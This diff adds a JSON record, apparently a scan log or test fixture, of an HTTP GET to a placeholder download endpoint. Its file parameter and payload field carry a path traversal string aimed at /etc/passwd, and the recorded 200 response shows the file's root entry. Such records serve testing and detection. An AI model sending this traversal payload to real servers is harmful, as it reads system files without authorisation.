@@ -1,0 +1,20 @@
+{
+  "url": "https://example.com/download",
+  "method": "GET",
+  "headers": {
+    "User-Agent": "Mozilla/5.0",
+    "Accept": "application/octet-stream"
+  },
+  "params": {
+    "file": "../../../../../etc/passwd"
+  },
+  "body": "",
+  "payload": "../../../../../etc/passwd",
+  "response_status": 200,
+  "response_headers": {
+    "Content-Disposition": "attachment; filename=\"passwd\"",
+    "Content-Type": "application/octet-stream"
+  },
+  "response_body": "root:x:0:0:root:/root:/bin/bash\n...",
+  "timestamp": "2025-05-25T16:15:00Z"
+}
